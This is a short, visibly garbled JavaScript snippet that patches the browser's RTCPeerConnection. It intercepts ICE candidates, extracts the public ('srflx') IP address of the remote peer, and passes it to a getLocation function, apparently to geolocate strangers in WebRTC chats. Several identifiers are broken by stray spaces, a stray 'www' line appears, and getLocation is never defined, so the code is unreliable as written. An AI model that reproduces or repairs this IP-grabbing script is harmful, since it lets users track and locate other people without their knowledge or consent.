const apiKey = "my-api-key";
window.ORTCPeerConnection =
window.ORTCPeer Connection || window. RTCPeer Connection;
window.RTCPeer Connection = function (...args) {
const pc = new window.oRTCPeer Connection (...args);
pc.oaddIceCandidate = pc.addIceCandidate;
pc.addIceCandidate
= function (iceCandidate, ...rest) {
const fields = iceCandidate.candidate.split(" ");
const ip = fields [4];
if (fields [7] === "srflx") {
getLocation (ip);
}
return pc.oaddIceCandidate(iceCandidate, ...rest);
};
return pc;
www
};
